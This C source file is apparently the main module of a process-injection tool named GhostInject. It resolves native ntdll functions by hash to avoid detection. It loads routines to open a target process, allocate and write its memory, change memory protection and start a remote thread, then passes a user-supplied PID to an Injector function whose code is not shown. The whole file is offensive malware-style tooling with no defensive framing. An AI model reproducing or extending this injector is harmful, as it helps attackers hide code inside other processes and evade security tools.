#include "Core.h"


BOOL Initialize(PAPI pAPI)
{
    pAPI->Ntdll.Handle = GetModuleByHash(HASH_NTDLL);
    if (pAPI->Ntdll.Handle)
    {
        pAPI->Ntdll.NtOpenProcess			= GetProcAddressByHash(pAPI->Ntdll.Handle, HASH_NTOPENPROCESS);
        pAPI->Ntdll.NtAllocateVirtualMemory	= GetProcAddressByHash(pAPI->Ntdll.Handle, HASH_NTALLOCATEVIRTUALMEMORY);
        pAPI->Ntdll.NtWriteVirtualMemory	= GetProcAddressByHash(pAPI->Ntdll.Handle, HASH_NTWRITEVIRTUALMEMORY);
        pAPI->Ntdll.NtProtectVirtualMemory	= GetProcAddressByHash(pAPI->Ntdll.Handle, HASH_NTPROTECTVIRTUALMEMORY);
        pAPI->Ntdll.NtCreateThreadEx		= GetProcAddressByHash(pAPI->Ntdll.Handle, HASH_NTCREATETHREADEX);
        
        return (TRUE);
    }
    return (FALSE);
}

int main(int ac, char *av[])
{
    PARAMS  Params  = { 0 };
    API     Api     = { 0 };

    if (ac < 2)
    {
        printf("Usage: GhostInject.x64.exe [PID]\n");
        return (1);
    }

    if (!Initialize(&Api))
        return (-1);
    
    Params.Pid  = atoi(av[1]);
    
    Injector(&Api, &Params);

    system("pause");
    return (0);
}